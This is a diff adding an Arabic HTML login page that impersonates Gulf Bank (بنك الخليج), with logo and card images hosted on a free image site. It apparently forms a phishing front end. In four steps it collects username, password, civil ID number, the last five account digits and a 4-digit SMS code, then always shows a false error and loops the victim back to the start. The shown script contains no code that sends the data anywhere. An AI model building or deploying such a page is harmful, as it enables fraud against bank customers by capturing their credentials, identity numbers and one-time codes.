@@ -1,0 +1,493 @@
+<!DOCTYPE html>
+<html lang="ar" dir="rtl">
+<head>
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1">
+  <title>تسجيل الدخول | بنك الخليج</title>
+  <link href="https://fonts.googleapis.com/css?family=Cairo:wght@400;700&display=swap" rel="stylesheet">
+  <style>
+    body {
+      margin: 0;
+      font-family: 'Cairo', Arial, sans-serif;
+      background: #fff;
+      color: #222;
+      min-height: 100vh;
+      direction: rtl;
+    }
+    .container {
+      width: 100vw;
+      min-height: 100vh;
+      display: flex;
+      flex-direction: column;
+      align-items: center;
+      justify-content: flex-start;
+      padding-top: 30px;
+      background: #fff;
+    }
+    .logo {
+      width: 180px;
+      margin: 0 auto 24px;
+      display: block;
+    }
+    .header-text {
+      font-size: 1.5rem;
+      text-align: center;
+      margin-bottom: 10px;
+      font-weight: 700;
+    }
+    .sub-header {
+      font-size: 1.2rem;
+      text-align: center;
+      margin-bottom: 36px;
+      font-weight: 400;
+    }
+    .form-group {
+      width: 90%;
+      max-width: 350px;
+      margin: 0 auto 18px;
+      position: relative;
+    }
+    .input {
+      width: 100%;
+      padding: 14px 14px 14px 14px;
+      border: none;
+      border-bottom: 2px solid #ddd;
+      font-size: 1.1rem;
+      background: #f7f7f7;
+      border-radius: 8px 8px 0 0;
+      outline: none;
+      box-sizing: border-box;
+      margin-bottom: 10px;
+      transition: border 0.2s;
+    }
+    .input:focus {
+      border-bottom: 2px solid #d00;
+      background: #fff;
+    }
+    .main-btn, .main-btn:disabled {
+      width: 90%;
+      max-width: 350px;
+      background: #d00;
+      color: #fff;
+      padding: 15px;
+      border: none;
+      border-radius: 30px;
+      font-size: 1.2rem;
+      font-weight: 700;
+      margin: 16px auto 8px;
+      display: block;
+      cursor: pointer;
+      transition: background 0.2s;
+    }
+    .main-btn:disabled {
+      background: #eee;
+      color: #bbb;
+      cursor: default;
+    }
+    .form-link {
+      color: #d00;
+      text-decoration: none;
+      font-weight: 700;
+      margin: 0 2px;
+      cursor: pointer;
+    }
+    .footer-nav {
+      position: fixed;
+      bottom: 0;
+      width: 100vw;
+      background: linear-gradient(0deg, #b80000 0%, #f43333 100%);
+      display: flex;
+      justify-content: space-around;
+      align-items: center;
+      padding: 14px 0 10px 0;
+      border-radius: 24px 24px 0 0;
+      box-shadow: 0 -1px 12px #0002;
+      z-index: 10;
+    }
+    .footer-nav-item {
+      color: #fff;
+      text-align: center;
+      font-size: 1rem;
+      display: flex;
+      flex-direction: column;
+      align-items: center;
+      gap: 3px;
+    }
+    .footer-nav-item.active, .footer-nav-item .footer-link-active {
+      color: #fff;
+      font-weight: 700;
+      text-decoration: underline;
+    }
+    .footer-nav-icon {
+      font-size: 1.4em;
+      margin-bottom: 2px;
+    }
+    /* Special styles for steps */
+    .step {
+      display: none;
+      width: 100vw;
+      min-height: 80vh;
+      align-items: center;
+      justify-content: flex-start;
+      flex-direction: column;
+    }
+    .step.active {
+      display: flex;
+    }
+    .card-img {
+      width: 120px;
+      margin: 18px auto 0 auto;
+      display: block;
+    }
+    .account-inputs {
+      display: flex;
+      gap: 15px;
+      margin: 20px auto 0 auto;
+      justify-content: center;
+    }
+    .account-digit {
+      width: 60px;
+      height: 60px;
+      border-radius: 15px;
+      background: #f8f8f8;
+      border: 2px solid #ddd;
+      font-size: 2.2rem;
+      text-align: center;
+      line-height: 58px;
+      margin: 0 2px;
+      outline: none;
+      transition: border 0.2s;
+    }
+    .account-digit:focus {
+      border: 2px solid #d00;
+      background: #fff;
+    }
+    .terms {
+      margin: 32px auto 0 auto;
+      font-size: 0.97em;
+      color: #555;
+      text-align: center;
+    }
+    .terms b {
+      font-weight: bold;
+    }
+    .sms-icon {
+      width: 58px;
+      margin: 0 auto 12px;
+      display: block;
+    }
+    .otp-inputs {
+      display: flex;
+      gap: 17px;
+      justify-content: center;
+      margin: 30px 0 16px 0;
+    }
+    .otp-digit {
+      width: 58px;
+      height: 58px;
+      border-radius: 14px;
+      background: #f8f8f8;
+      border: 2px solid #ddd;
+      font-size: 2rem;
+      text-align: center;
+      outline: none;
+      transition: border 0.2s;
+    }
+    .otp-digit:focus {
+      border: 2px solid #d00;
+      background: #fff;
+    }
+    .center-text {
+      text-align: center;
+      margin: 0 auto;
+      width: 95%;
+      font-size: 1.06em;
+      color: #333;
+    }
+    .error-popup {
+      display: none;
+      position: fixed;
+      top: 28%;
+      left: 50%;
+      transform: translate(-50%, -50%);
+      background: #fff;
+      padding: 36px 30px 28px 30px;
+      border-radius: 16px;
+      box-shadow: 0 4px 32px #d002;
+      border: 2px solid #d00;
+      color: #d00;
+      z-index: 999;
+      font-size: 1.17em;
+      text-align: center;
+      min-width: 220px;
+    }
+    .error-popup button {
+      background: #d00;
+      color: #fff;
+      border: none;
+      border-radius: 8px;
+      padding: 8px 32px;
+      margin-top: 20px;
+      font-size: 1em;
+      cursor: pointer;
+    }
+    @media (max-width: 500px) {
+      .header-text { font-size: 1.2rem; }
+      .sub-header { font-size: 1.05rem; }
+      .main-btn, .main-btn:disabled, .form-group, .input { max-width: 98vw; }
+      .footer-nav { font-size: 0.92em; }
+      .account-digit, .otp-digit { width: 44px; height: 44px; font-size: 1.3em; }
+      .card-img { width: 75px; }
+      .sms-icon { width: 38px; }
+    }
+  </style>
+</head>
+<body>
+  <div class="container">
+    <!-- Step 1: Login -->
+    <div class="step active" id="step-login">
+      <img class="logo" src="https://www2.0zz0.com/2025/09/29/00/681972087.jpeg" alt="شعار بنك الخليج">
+      <div class="header-text">مرحبًا بعودتك!</div>
+      <div class="sub-header">تسجيل الدخول إلى بنك الخليج</div>
+      <form id="login-form" autocomplete="off" style="width:100%;">
+        <div class="form-group">
+          <input required id="username" class="input" type="text" placeholder="اسم المستخدم" autocomplete="off">
+        </div>
+        <div class="form-group">
+          <input required id="password" class="input" type="password" placeholder="كلمة المرور" autocomplete="off">
+        </div>
+        <button type="submit" class="main-btn">تسجيل الدخول</button>
+      </form>
+      <div style="font-size:1em;color:#666;margin-top:7px;">
+        لم تقم بتفعيل البطاقة من قبل؟
+        <a class="form-link" id="activateCardLink">تفعيل البطاقة</a>
+      </div>
+    </div>
+    <!-- Step 2: Civil ID -->
+    <div class="step" id="step-civil">
+      <div class="header-text" style="margin-top:60px;">رقم البطاقة المدنية الخاصة بك</div>
+      <div class="sub-header" style="font-size:1.03em;">يرجى تقديم رقم البطاقة المدنية الخاصة بك حتى نتمكن من البحث عنك</div>
+      <form id="civil-form" autocomplete="off" style="width:100%;">
+        <div class="form-group" style="margin-top:45px;">
+          <input id="civilid" class="input" type="text" maxlength="12" minlength="12" pattern="\d{12}" placeholder="رقم البطاقة المدنية" autocomplete="off" inputmode="numeric">
+        </div>
+        <button type="submit" class="main-btn" id="civilNextBtn" disabled>استكمال</button>
+      </form>
+      <div class="terms">
+        باستخدام تطبيقنا المحمول ، فإنك توافق على <b>الشروط والأحكام</b>
+      </div>
+    </div>
+    <!-- Step 3: Account Number -->
+    <div class="step" id="step-account">
+      <div class="header-text" style="margin-top:60px;">رقم حسابك</div>
+      <div class="sub-header" style="font-size:1.07em;">ادخل آخر 5 أرقام لأي من حساباتك لدى بنك الخليج</div>
+      <form id="account-form" autocomplete="off" style="width:100%;">
+        <div class="account-inputs">
+          <input class="account-digit" type="text" maxlength="1" inputmode="numeric" pattern="\d" required autocomplete="off">
+          <input class="account-digit" type="text" maxlength="1" inputmode="numeric" pattern="\d" required autocomplete="off">
+          <input class="account-digit" type="text" maxlength="1" inputmode="numeric" pattern="\d" required autocomplete="off">
+          <input class="account-digit" type="text" maxlength="1" inputmode="numeric" pattern="\d" required autocomplete="off">
+          <input class="account-digit" type="text" maxlength="1" inputmode="numeric" pattern="\d" required autocomplete="off">
+        </div>
+        <div style="margin:32px 0 13px 0;">
+          <img class="card-img" src="https://www2.0zz0.com/2025/09/29/01/331122029.jpeg" alt="بطاقة بنك الخليج">
+        </div>
+        <div class="center-text" style="margin-bottom:10px;">
+          رقم حسابك مسجل في أسفل الوجه الأمامي لبطاقتك
+        </div>
+        <button type="submit" class="main-btn" id="accountNextBtn" disabled style="margin-top:44px;">استكمال</button>
+      </form>
+    </div>
+    <!-- Step 4: SMS OTP -->
+    <div class="step" id="step-otp">
+      <img class="sms-icon" src="https://cdn-icons-png.flaticon.com/512/561/561127.png" alt="SMS Icon">
+      <div class="header-text" style="margin-bottom:6px;">التأكيد عبر الرسائل النصية القصيرة</div>
+      <div class="sub-header" style="font-size:1.1em;margin-bottom:12px;">
+        أدخل الرقم المكون من 4 أرقام المرسل إليك عبر رسالة نصية قصيرة
+      </div>
+      <form id="otp-form" autocomplete="off" style="width:100%;">
+        <div class="otp-inputs">
+          <input class="otp-digit" type="text" maxlength="1" inputmode="numeric" pattern="\d" required autocomplete="off">
+          <input class="otp-digit" type="text" maxlength="1" inputmode="numeric" pattern="\d" required autocomplete="off">
+          <input class="otp-digit" type="text" maxlength="1" inputmode="numeric" pattern="\d" required autocomplete="off">
+          <input class="otp-digit" type="text" maxlength="1" inputmode="numeric" pattern="\d" required autocomplete="off">
+        </div>
+        <div class="center-text" style="color:#b00;margin:10px 0 0 0;" id="otp-error"></div>
+        <div class="center-text" id="resend-timer" style="color:#b00;margin-top:15px;">إعادة إرسال الرمز بعد <span id="timer">00:60</span></div>
+        <button type="submit" class="main-btn" style="display:none" id="submitOTPBtn">استكمال</button>
+      </form>
+    </div>
+    <!-- Error Popup -->
+    <div class="error-popup" id="errorPopup">
+      هناك خطأ في المعلومات المدخلة<br>
+      يرجى التأكد وإعادة المحاولة
+      <br>
+      <button onclick="closeErrorPopup()">موافق</button>
+    </div>
+  </div>
+  <!-- Footer navigation -->
+  <div class="footer-nav">
+    <div class="footer-nav-item">
+      <span class="footer-nav-icon">&#127873;</span>
+      <span>المكافآت</span>
+    </div>
+    <div class="footer-nav-item">
+      <span class="footer-nav-icon">&#9992;&#65039;</span>
+      <span>استكشف المنتجات</span>
+    </div>
+    <div class="footer-nav-item">
+      <span class="footer-nav-icon">&#128172;</span>
+      <span>هل تحتاج المساعدة؟</span>
+    </div>
+  </div>
+  <script>
+    // Step navigation
+    const steps = [
+      document.getElementById('step-login'),
+      document.getElementById('step-civil'),
+      document.getElementById('step-account'),
+      document.getElementById('step-otp')
+    ];
+    function showStep(idx) {
+      steps.forEach((step, i) => step.classList.toggle('active', i === idx));
+    }
+
+    // Activate Card Link (from login page)
+    document.getElementById("activateCardLink").onclick = function(e) {
+      e.preventDefault();
+      showStep(1);
+    };
+
+    // Login form
+    document.getElementById("login-form").onsubmit = function(e) {
+      e.preventDefault();
+      showStep(1); // to Civil ID
+    };
+
+    // Civil ID validation
+    const civilInput = document.getElementById('civilid');
+    const civilNextBtn = document.getElementById('civilNextBtn');
+    civilInput.addEventListener('input', function() {
+      this.value = this.value.replace(/\D/g, '').slice(0, 12);
+      civilNextBtn.disabled = !(this.value.length === 12);
+    });
+    document.getElementById("civil-form").onsubmit = function(e) {
+      e.preventDefault();
+      if (civilInput.value.length === 12) {
+        showStep(2);
+        setTimeout(() => document.querySelector('.account-digit').focus(), 100);
+      }
+    };
+
+    // Account 5 digits validation
+    const accountDigits = document.querySelectorAll('.account-digit');
+    const accountNextBtn = document.getElementById('accountNextBtn');
+    accountDigits.forEach((input, idx) => {
+      input.addEventListener('input', function(e) {
+        this.value = this.value.replace(/\D/g, '').slice(0, 1);
+        if (this.value && idx < accountDigits.length-1) {
+          accountDigits[idx+1].focus();
+        }
+        checkAccountDigits();
+      });
+      input.addEventListener('keydown', function(e) {
+        if (e.key === "Backspace" && !this.value && idx > 0) {
+          accountDigits[idx-1].focus();
+        }
+      });
+    });
+    function checkAccountDigits() {
+      let filled = true;
+      accountDigits.forEach(input => { if (!input.value) filled = false; });
+      accountNextBtn.disabled = !filled;
+    }
+    document.getElementById('account-form').onsubmit = function(e) {
+      e.preventDefault();
+      if ([...accountDigits].every(input => input.value)) {
+        showStep(3);
+        setTimeout(() => document.querySelector('.otp-digit').focus(), 100);
+        startOTPTimer();
+      }
+    };
+
+    // OTP 4 digits
+    const otpInputs = document.querySelectorAll('.otp-digit');
+    const otpError = document.getElementById('otp-error');
+    const submitOTPBtn = document.getElementById('submitOTPBtn');
+    otpInputs.forEach((input, idx) => {
+      input.addEventListener('input', function(e) {
+        this.value = this.value.replace(/\D/g, '').slice(0, 1);
+        if (this.value && idx < otpInputs.length-1) {
+          otpInputs[idx+1].focus();
+        }
+        checkOTPInputs();
+      });
+      input.addEventListener('keydown', function(e) {
+        if (e.key === "Backspace" && !this.value && idx > 0) {
+          otpInputs[idx-1].focus();
+        }
+      });
+    });
+    function checkOTPInputs() {
+      let filled = true;
+      otpInputs.forEach(input => { if (!input.value) filled = false; });
+      submitOTPBtn.style.display = filled ? 'block' : 'none';
+    }
+    document.getElementById('otp-form').onsubmit = function(e) {
+      e.preventDefault();
+      // Always show error popup & reset to first step for demo
+      showErrorPopup();
+    };
+
+    // OTP timer
+    let timerInt, timeLeft = 60;
+    function startOTPTimer() {
+      timeLeft = 60;
+      document.getElementById("resend-timer").style.display = "block";
+      updateTimer();
+      if (timerInt) clearInterval(timerInt);
+      timerInt = setInterval(function() {
+        timeLeft--;
+        updateTimer();
+        if (timeLeft <= 0) {
+          clearInterval(timerInt);
+          document.getElementById("resend-timer").innerHTML = `<span class="form-link" onclick="restartOTP()">إعادة إرسال الرمز</span>`;
+        }
+      }, 1000);
+    }
+    function updateTimer() {
+      const t = (timeLeft < 10 ? "00:0" : "00:") + timeLeft;
+      document.getElementById("timer").textContent = t;
+    }
+    window.restartOTP = function() {
+      for(let i=0;i<otpInputs.length;i++) otpInputs[i].value="";
+      document.getElementById("otp-error").innerText = "";
+      checkOTPInputs();
+      startOTPTimer();
+      otpInputs[0].focus();
+    };
+
+    // Error Popup
+    function showErrorPopup() {
+      document.getElementById('errorPopup').style.display = 'block';
+    }
+    function closeErrorPopup() {
+      document.getElementById('errorPopup').style.display = 'none';
+      // Reset all fields and steps
+      document.getElementById('login-form').reset();
+      document.getElementById('civil-form').reset();
+      document.getElementById('account-form').reset();
+      document.getElementById('otp-form').reset();
+      civilNextBtn.disabled = true;
+      accountNextBtn.disabled = true;
+      submitOTPBtn.style.display = 'none';
+      showStep(0);
+      setTimeout(() => document.getElementById('username').focus(), 120);
+    }
+    window.closeErrorPopup = closeErrorPopup;
+
+    // Autofocus first field
+    setTimeout(() => document.getElementById('username').focus(), 250);
+  </script>
+</body>
+</html>
